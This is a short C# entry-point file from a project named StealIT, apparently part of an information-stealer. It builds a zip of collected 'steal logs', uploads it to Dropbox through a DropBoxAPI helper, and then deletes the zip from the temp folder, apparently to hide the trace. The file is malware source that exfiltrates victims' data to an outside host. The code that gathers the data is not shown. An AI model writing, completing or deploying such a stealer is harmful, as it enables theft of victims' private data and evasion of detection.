using System.IO;
using System.Threading.Tasks;

namespace StealIT
{
    public class Program
    {
        static void Main(string[] args)
        => new Program().StartAsync().GetAwaiter().GetResult();

        public async Task StartAsync()
        {
            StealIT SIT = new StealIT();
            await DropBoxAPI.Upload(File.ReadAllBytes(SIT.GetZip()));
            File.Delete(Path.GetTempPath() + "StealLOGSSend.zip");
        }
    }
}
